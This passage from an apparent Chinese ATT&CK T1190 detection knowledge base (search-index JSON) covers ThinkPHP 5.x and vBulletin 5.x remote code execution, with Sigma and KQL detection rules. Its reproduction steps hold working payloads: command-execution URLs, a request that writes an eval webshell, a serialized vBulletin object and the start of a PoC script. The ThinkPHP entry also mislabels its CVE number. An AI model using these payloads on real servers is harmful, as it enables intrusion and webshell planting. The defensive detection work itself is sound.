\"msbuild.exe\" or set_ProcessCommandLine has \"msconfig.exe\" or set_ProcessCommandLine has \"msdeploy.exe\" or set_ProcessCommandLine has \"msdt.exe\" or set_ProcessCommandLine has \"mshta.exe\" or set_ProcessCommandLine has \"mshtml.dll\" or set_ProcessCommandLine has \"msiexec.exe\" or set_ProcessCommandLine has \"msxsl.exe\" or set_ProcessCommandLine has \"odbcconf.exe\" or set_ProcessCommandLine has \"pcalua.exe\" or set_ProcessCommandLine has \"pcwrun.exe\" or set_ProcessCommandLine has \"pcwutl.dll\" or set_ProcessCommandLine has \"pester.bat\" or set_ProcessCommandLine has \"presentationhost.exe\" or set_ProcessCommandLine has \"pubprn.vbs\" or set_ProcessCommandLine has \"rcsi.exe\" or set_ProcessCommandLine has \"regasm.exe\" or set_ProcessCommandLine has \"register-cimprovider.exe\" or set_ProcessCommandLine has \"regsvcs.exe\" or set_ProcessCommandLine has \"regsvr32.exe\" or set_ProcessCommandLine has \"replace.exe\" or set_ProcessCommandLine has \"rundll32.exe\" or set_ProcessCommandLine has \"runonce.exe\" or set_ProcessCommandLine has \"runscripthelper.exe\" or set_ProcessCommandLine has \"schtasks.exe\" or set_ProcessCommandLine has \"scriptrunner.exe\" or set_ProcessCommandLine has \"setupapi.dll\" or set_ProcessCommandLine has \"shdocvw.dll\" or set_ProcessCommandLine has \"shell32.dll\" or set_ProcessCommandLine has \"slmgr.vbs\" or set_ProcessCommandLine has \"sqltoolsps.exe\" or set_ProcessCommandLine has \"syncappvpublishingserver.exe\" or set_ProcessCommandLine has \"syncappvpublishingserver.vbs\" or set_ProcessCommandLine has \"syssetup.dll\" or set_ProcessCommandLine has \"te.exe\" or set_ProcessCommandLine has \"tracker.exe\" or set_ProcessCommandLine has \"url.dll\" or set_ProcessCommandLine has \"verclsid.exe\" or set_ProcessCommandLine has \"vsjitdebugger.exe\" or set_ProcessCommandLine has \"wab.exe\" or set_ProcessCommandLine has \"winrm.vbs\" or set_ProcessCommandLine has \"wmic.exe\" or set_ProcessCommandLine has \"xwizard.exe\" or set_ProcessCommandLine has \"zipfldr.dll\" | sort by DeviceId , Timestamp asc \u89e3\u91ca\uff1a\u5f53\u521d\u59cb\u5316\u8fdb\u7a0b\u4e3a\"sqlservr.exe\"\uff0c\"sqlagent.exe\"\uff0c\"sqlps.exe\"\uff0c\"launchpad.exe\"\uff0c\u8fdb\u7a0b\u547d\u4ee4\u884c\u4e2d\u5305\u542b\u4ee5\u4e0a\u8fdb\u7a0b\u540d\u79f0OR\u547d\u4ee4\u884c\u53c2\u6570\u65f6\uff0c\u53ef\u80fd\u662f\u5f02\u5e38\u7684\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#_6","text":"\u672a\u7ecf\u5b9e\u9645\u6d4b\u8bd5\uff0c\u4ec5\u5177\u5907\u4e00\u5b9a\u7684\u53c2\u8003\u4ef7\u503c\u3002","title":"\u5efa\u8bae"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-SQL%20server%E6%BB%A5%E7%94%A8/#_7","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/","text":"T1190-Thinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 CVE-2020-16875\u6f0f\u6d1e \u7b80\u4ecb ThinkPHP\u5b98\u65b92018\u5e7412\u67089\u65e5\u53d1\u5e03\u91cd\u8981\u7684\u5b89\u5168\u66f4\u65b0\uff0c\u4fee\u590d\u4e86\u4e00\u4e2a\u4e25\u91cd\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u8be5\u66f4\u65b0\u4e3b\u8981\u6d89\u53ca\u4e00\u4e2a\u5b89\u5168\u66f4\u65b0\uff0c\u7531\u4e8e\u6846\u67b6\u5bf9\u63a7\u5236\u5668\u540d\u6ca1\u6709\u8fdb\u884c\u8db3\u591f\u7684\u68c0\u6d4b\u4f1a\u5bfc\u81f4\u5728\u6ca1\u6709\u5f00\u542f\u5f3a\u5236\u8def\u7531\u7684\u60c5\u51b5\u4e0b\u53ef\u80fd\u7684getshell\u6f0f\u6d1e\uff0c\u53d7\u5f71\u54cd\u7684\u7248\u672c\u5305\u62ec5.0\u548c5.1\u7248\u672c\uff0c\u63a8\u8350\u5c3d\u5feb\u66f4\u65b0\u5230\u6700\u65b0\u7248\u672c\u3002 \u5f71\u54cd\u7248\u672c 5.x < 5.1.31, <= 5.0.23 \u6d4b\u8bd5\u6848\u4f8b \u6f0f\u6d1e\u5206\u6790\u53ca\u6f0f\u6d1e\u5229\u7528\u53ef\u53c2\u8003Thinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff1a https://www.cnblogs.com/backlion/p/10106676.html \u68c0\u6d4b\u65e5\u5fd7 HTTP_log\uff0c\u8bbf\u95ee\u65e5\u5fd7\u4e5f\u53ef\u4ee5 \u6d4b\u8bd5\u590d\u73b0 1.\u5229\u7528system\u51fd\u6570\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c http://localhost:9096/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami 2.\u901a\u8fc7phpinfo\u51fd\u6570\u5199\u51faphpinfo()\u7684\u4fe1\u606f http://localhost:9096/public/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 3.\u5199\u5165shell: http://localhost:9096/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php \u6216\u8005 http://localhost:9096/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=../test.php&vars[1][]=<?php echo 'ok';?> \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: Thinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e description: \u901a\u8fc7\u8bbf\u95ee\u65e5\u5fd7orHttp.log\u68c0\u6d4bThinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u884c\u4e3a translator: 12306Bro date: 2020/12/12 status: experimental references: - https://www.cnblogs.com/backlion/p/10106676.html logsource: category: webserver detection: selection: c-uri: - '/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: critical \u5907\u6ce8 \u5728\u5177\u4f53\u4e1a\u52a1\u573a\u666f\u4e0b\u9047\u5230\uff0c\u7279\u8bb0\u5f55\u3002\u53ef\u4ee5\u6839\u636e\u5177\u4f53payload\u6765\u5224\u65ad\u662f\u5426\u4e3a\u771f\u5b9e\u653b\u51fb\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ Thinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff1a https://www.cnblogs.com/backlion/p/10106676.html","title":"T1190-Thinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#t1190-thinkphp-5x","text":"","title":"T1190-Thinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u68c0\u6d4b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#attck","text":"\u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#cve-2020-16875","text":"","title":"CVE-2020-16875\u6f0f\u6d1e"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_1","text":"ThinkPHP\u5b98\u65b92018\u5e7412\u67089\u65e5\u53d1\u5e03\u91cd\u8981\u7684\u5b89\u5168\u66f4\u65b0\uff0c\u4fee\u590d\u4e86\u4e00\u4e2a\u4e25\u91cd\u7684\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u3002\u8be5\u66f4\u65b0\u4e3b\u8981\u6d89\u53ca\u4e00\u4e2a\u5b89\u5168\u66f4\u65b0\uff0c\u7531\u4e8e\u6846\u67b6\u5bf9\u63a7\u5236\u5668\u540d\u6ca1\u6709\u8fdb\u884c\u8db3\u591f\u7684\u68c0\u6d4b\u4f1a\u5bfc\u81f4\u5728\u6ca1\u6709\u5f00\u542f\u5f3a\u5236\u8def\u7531\u7684\u60c5\u51b5\u4e0b\u53ef\u80fd\u7684getshell\u6f0f\u6d1e\uff0c\u53d7\u5f71\u54cd\u7684\u7248\u672c\u5305\u62ec5.0\u548c5.1\u7248\u672c\uff0c\u63a8\u8350\u5c3d\u5feb\u66f4\u65b0\u5230\u6700\u65b0\u7248\u672c\u3002","title":"\u7b80\u4ecb"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_2","text":"5.x < 5.1.31, <= 5.0.23","title":"\u5f71\u54cd\u7248\u672c"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_3","text":"\u6f0f\u6d1e\u5206\u6790\u53ca\u6f0f\u6d1e\u5229\u7528\u53ef\u53c2\u8003Thinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff1a https://www.cnblogs.com/backlion/p/10106676.html","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_4","text":"HTTP_log\uff0c\u8bbf\u95ee\u65e5\u5fd7\u4e5f\u53ef\u4ee5","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_5","text":"1.\u5229\u7528system\u51fd\u6570\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c http://localhost:9096/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami 2.\u901a\u8fc7phpinfo\u51fd\u6570\u5199\u51faphpinfo()\u7684\u4fe1\u606f http://localhost:9096/public/index.php?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1 3.\u5199\u5165shell: http://localhost:9096/public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php \u6216\u8005 http://localhost:9096/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=../test.php&vars[1][]=<?php echo 'ok';?>","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_6","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_7","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#sigma","text":"title: Thinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e description: \u901a\u8fc7\u8bbf\u95ee\u65e5\u5fd7orHttp.log\u68c0\u6d4bThinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u884c\u4e3a translator: 12306Bro date: 2020/12/12 status: experimental references: - https://www.cnblogs.com/backlion/p/10106676.html logsource: category: webserver detection: selection: c-uri: - '/public/index.php?s=index/think\\app/invokefunction&function=call_user_func_array' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: critical","title":"sigma\u89c4\u5219"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_8","text":"\u5728\u5177\u4f53\u4e1a\u52a1\u573a\u666f\u4e0b\u9047\u5230\uff0c\u7279\u8bb0\u5f55\u3002\u53ef\u4ee5\u6839\u636e\u5177\u4f53payload\u6765\u5224\u65ad\u662f\u5426\u4e3a\u771f\u5b9e\u653b\u51fb\u3002","title":"\u5907\u6ce8"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-Thinkphp%205.x%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%A3%80%E6%B5%8B/#_9","text":"MITRE-ATT&CK-T1190 https://attack.mitre.org/techniques/T1190/ Thinkphp 5.x\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff1a https://www.cnblogs.com/backlion/p/10106676.html","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x3_%E5%88%9D%E5%A7%8B%E8%AE%BF%E9%97%AE/T1190-vBulletin5.X-RCE%E6%A3%80%E6%B5%8B/","text":"T1190-vBulletin5.X-RCE\u68c0\u6d4b \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u4f7f\u7528\u8f6f\u4ef6\uff0c\u6570\u636e\u6216\u547d\u4ee4\u6765\u5229\u7528\u9762\u5411Internet\u7684\u8ba1\u7b97\u673a\u7cfb\u7edf\u6216\u7a0b\u5e8f\u4e2d\u7684\u5f31\u70b9\uff0c\u4ece\u800c\u5bfc\u81f4\u610f\u5916\u6216\u65e0\u6cd5\u9884\u671f\u7684\u884c\u4e3a\u3002\u7cfb\u7edf\u7684\u5f31\u70b9\u53ef\u80fd\u662f\u9519\u8bef\u3001\u6545\u969c\u6216\u8bbe\u8ba1\u6f0f\u6d1e\u3002\u8fd9\u4e9b\u5e94\u7528\u7a0b\u5e8f\u901a\u5e38\u662f\u7f51\u7ad9\uff0c\u4f46\u662f\u53ef\u4ee5\u5305\u62ec\u6570\u636e\u5e93\uff08\u4f8b\u5982SQL\uff09\uff0c\u6807\u51c6\u670d\u52a1\uff08\u4f8b\u5982SMB \u6216SSH\uff09\u4ee5\u53ca\u5177\u6709Internet\u53ef\u8bbf\u95ee\u5f00\u653e\u7684\u4efb\u4f55\u5176\u4ed6\u5e94\u7528\u7a0b\u5e8f\uff0c\u4f8b\u5982Web\u670d\u52a1\u5668\u548c\u76f8\u5173\u670d\u52a1\u3002\u6839\u636e\u6240\u5229\u7528\u7684\u7f3a\u9677\uff0c\u8fd9\u53ef\u80fd\u5305\u62ec\u201c\u5229\u7528\u9632\u5fa1\u9632\u536b\u201d\u3002 \u5982\u679c\u5e94\u7528\u7a0b\u5e8f\u6258\u7ba1\u5728\u57fa\u4e8e\u4e91\u7684\u57fa\u7840\u67b6\u6784\u4e0a\uff0c\u5219\u5bf9\u5176\u8fdb\u884c\u5229\u7528\u53ef\u80fd\u4f1a\u5bfc\u81f4\u57fa\u7840\u5b9e\u9645\u5e94\u7528\u53d7\u5230\u635f\u5bb3\u3002\u8fd9\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u83b7\u5f97\u8bbf\u95ee\u4e91API\u6216\u5229\u7528\u5f31\u8eab\u4efd\u548c\u8bbf\u95ee\u7ba1\u7406\u7b56\u7565\u7684\u8def\u5f84\u3002 \u5bf9\u4e8e\u7f51\u7ad9\u548c\u6570\u636e\u5e93\uff0cOWASP\u6392\u540d\u524d10\u4f4d\u548cCWE\u6392\u540d\u524d25\u4f4d\u7a81\u51fa\u4e86\u6700\u5e38\u89c1\u7684\u57fa\u4e8eWeb\u7684\u6f0f\u6d1e\u3002 CVE-2015-7808\u6f0f\u6d1e vBulletin\u662f\u7528PHP\u7f16\u5199\u7684\u53ef\u5b9a\u5236\u7684\u8bba\u575b\u7a0b\u5e8f\u5957\u4ef6\u3002 vBulletin 5.1.4-5.1.9\u7248\u672c\uff0c\u67d0\u4e9b\u5185\u90e8API\u5904\u7406Ajax\u8bf7\u6c42\u65f6\uff0c\u672a\u9a8c\u8bc1\u5176\u6765\u6e90\uff0c\u8fd9\u53ef\u4f7f\u653b\u51fb\u8005\u65e0\u9700\u8eab\u4efd\u9a8c\u8bc1\u8c03\u7528\u7ee7\u627f\u81eavB_Api\u53ca/core/vb/api/\u4e0b\u4efb\u610f\u7c7b\u7684\u4efb\u610f\u516c\u5171\u65b9\u6cd5\uff0c\u5176\u4e2ddecodeArguments()\u65b9\u6cd5\u5185\u7684unserialize()\u51fd\u6570\u5b58\u5728\u5b89\u5168\u6f0f\u6d1e\uff0c\u53ef\u4f7f\u653b\u51fb\u8005\u5728\u2018$args\u2019\u53d8\u91cf\u4e2d\u6ce8\u5165\u7cbe\u5fc3\u6784\u9020\u7684\u4efb\u610f\u5bf9\u8c61\uff0c\u8fdc\u7a0b\u6267\u884cphp\u4ee3\u7801\uff0c\u83b7\u53d6\u670d\u52a1\u5668\u6743\u9650\u3002 \u5f71\u54cd\u7248\u672c VBulletin 5.1.4 - 5.1.9 \u6d4b\u8bd5\u6848\u4f8b \u8bf7\u53c2\u8003\uff1a vBulletin5.X\u524d\u53f0RCE\u5206\u6790\uff08CVE-2015-7808\uff09 https://xz.aliyun.com/t/6497 vBulletin 5 \u5168\u7248\u672c\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e\u5206\u6790 https://www.anquanke.com/post/id/82870 \u68c0\u6d4b\u65e5\u5fd7 \u8bbf\u95ee\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 GET /vBulletin/ajax/api/hook/decodeArguments?arguments=O%3A12%3A%22vB_dB_Result%22%3A2%3A%7Bs%3A5%3A%22%00%2A%00db%22%3BO%3A17%3A%22vB_Database_MySQL%22%3A1%3A%7Bs%3A9%3A%22functions%22%3Ba%3A1%3A%7Bs%3A11%3A%22free_result%22%3Bs%3A6%3A%22assert%22%3B%7D%7Ds%3A12%3A%22%00%2A%00recordset%22%3Bs%3A9%3A%22phpinfo%28%29%22%3B%7D HTTP/1.1 Host: 192.168.0.106 Cookie: XDEBUG_SESSION=PHPSTORM Connection: close \u89e3\u7801\u540e\uff1a GET /vBulletin/ajax/api/hook/decodeArguments?arguments=O:12:\"vB_dB_Result\":2:{s:5:\"*db\";O:17:\"vB_Database_MySQL\":1:{s:9:\"functions\";a:1:{s:11:\"free_result\";s:6:\"assert\";}}s:12:\"*recordset\";s:9:\"phpinfo()\";} HTTP/1.1 \u6d4b\u8bd5\u7559\u75d5 \u6682\u65e0 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: vBulletin5.X-CVE-2015-7808-RCE-\u68c0\u6d4b\u89c4\u5219 description: \u901a\u8fc7\u8bbf\u95ee\u65e5\u5fd7\u68c0\u6d4bCVE-2015-7808\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u5229\u7528\u884c\u4e3a translator: 12306Bro date: 2020/12/16 status: experimental references: - https://xz.aliyun.com/t/6497 logsource: category: webserver detection: selection: c-uri: - '*/ajax/api/hook/decodeArguments?arguments=*' condition: selection fields: - c-ip - c-dns falsepositives: - Unknown level: critical CVE-2019-16759 \u8fd1\u671f\uff0cvBulletin\u62ab\u9732\u4e86\u4e00\u4e2a\u6700\u65b0\u76840 day\u6f0f\u6d1e\u7ec6\u8282\uff0c\u8fd9\u4e2a\u6f0f\u6d1e\u5206\u914d\u7684CVE\u7f16\u53f7\u4e3aCVE-2019-16759\u3002\u4e0e\u6b64\u540c\u65f6\uff0cUnit 42\u7684\u5b89\u5168\u7814\u7a76\u4eba\u5458\u4e5f\u5728\u7f51\u4e0a\u53d1\u73b0\u4e86\u6709\u5f88\u591a\u653b\u51fb\u8005\u6b63\u5728\u5229\u7528\u8be5\u6f0f\u6d1e\u6765\u5b9e\u65bd\u653b\u51fb\u3002\u5728\u8be5\u6f0f\u6d1e\u7684\u5e2e\u52a9\u4e0b\uff0c\u672a\u7ecf\u8eab\u4efd\u9a8c\u8bc1\u7684\u653b\u51fb\u8005\u5c06\u80fd\u591f\u8bbf\u95ee\u548c\u63a7\u5236\u8fd0\u884c\u4e86v5.0.0\u81f3v5.5.4\u7248\u672cvBulletin\u7684\u670d\u52a1\u5668\uff0c\u5e76\u4e14\u963b\u6b62\u7f51\u7edc\u7ba1\u7406\u5458\u8bbf\u95ee\u8fd9\u4e9b\u670d\u52a1\u5668\u3002\u76ee\u524d\uff0c\u4f7f\u7528\u4e86vBulletin\u7684\u7f51\u7ad9\u6570\u91cf\u5927\u7ea6\u670910\u4e07\u591a\u4e2a\uff0c\u5176\u4e2d\u5305\u62ec\u5f88\u591a\u5927\u578b\u4f01\u4e1a\u3001\u7ec4\u7ec7\u548c\u8bba\u575b\uff0c\u56e0\u6b64\u8be5\u6f0f\u6d1e\u5e94\u5f53\u7acb\u523b\u88ab\u4fee\u590d\u3002 \u5f71\u54cd\u7248\u672c \u4ec5\u5f71\u54cd vBulletin 5.x \u7248\u672c \u6d4b\u8bd5\u6848\u4f8b \u8bf7\u53c2\u8003\uff1a CVE-2019-16759\u6f0f\u6d1e\u5728\u91ce\u5229\u7528 https://www.anquanke.com/post/id/189470 CVE-2019-16759 vBulletin 5.x RCE \u590d\u73b0 https://blog.csdn.net/weixin_41064688/article/details/108060313 CVE-2019-16759 vBulletin 5.x \u672a\u6388\u6743\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e https://github.com/jas502n/CVE-2019-16759 \u68c0\u6d4b\u65e5\u5fd7 \u8bbf\u95ee\u65e5\u5fd7 OR HTTP.log \u6d4b\u8bd5\u590d\u73b0 POC1 http://IP/?routestring=ajax%2Frender%2Fwidget_php&widgetConfig[code]=phpinfo();exit; POC2:CVE-2019-16759 vBulletin 5.x \u672a\u6388\u6743\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1e import requests import sys if len(sys.argv) != 2: sys.exit(\"Usage: %s <URL to vBulletin>\" % sys.argv[0]) proxies ={ \"http\":\"http://127.0.0.1:8080/\" } params = 